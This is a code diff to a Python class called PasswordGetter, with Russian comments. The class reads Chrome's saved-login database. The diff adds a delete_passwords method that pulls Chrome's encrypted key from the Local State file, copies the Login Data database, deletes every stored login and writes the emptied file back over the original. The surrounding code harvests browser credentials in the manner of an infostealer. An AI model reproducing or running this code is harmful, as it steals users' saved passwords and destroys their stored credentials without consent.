@@ -3,7 +3,7 @@ import sqlite3
 import os
 import json
 import base64
-
+import shutil
 
 class User:
     def __init__(self):
@@ -45,7 +45,7 @@ class PasswordGetter:
         # Копируем базу данных (Chrome должен быть закрыт)
         temp_db = "temp_login.db"
         if os.path.exists(login_db_path):
-            import shutil
+
             shutil.copy2(login_db_path, temp_db)
 
         # Подключаемся к базе
@@ -59,4 +59,26 @@ class PasswordGetter:
         conn.close()
         os.remove(temp_db)
         return users
+    def delete_passwords(self):
+        user_data_dir = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data')
+        local_state_path = os.path.join(user_data_dir, 'Local State')
+        login_db_path = os.path.join(user_data_dir, 'Default', 'Login Data')
 
+        # Извлекаем ключ AES
+        with open(local_state_path, "r", encoding="utf-8") as f:
+            local_state = json.loads(f.read())
+        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        key = encrypted_key[5:]  # Удаляем префикс DPAPI
+
+        # Копируем базу данных (Chrome должен быть закрыт)
+        temp_db = "temp_login.db"
+        if os.path.exists(login_db_path):
+            shutil.copy2(login_db_path, temp_db)
+
+        # Подключаемся к базе
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        cursor.execute('DELETE FROM logins')
+        conn.commit()
+        conn.close()
+        shutil.move(temp_db, login_db_path)
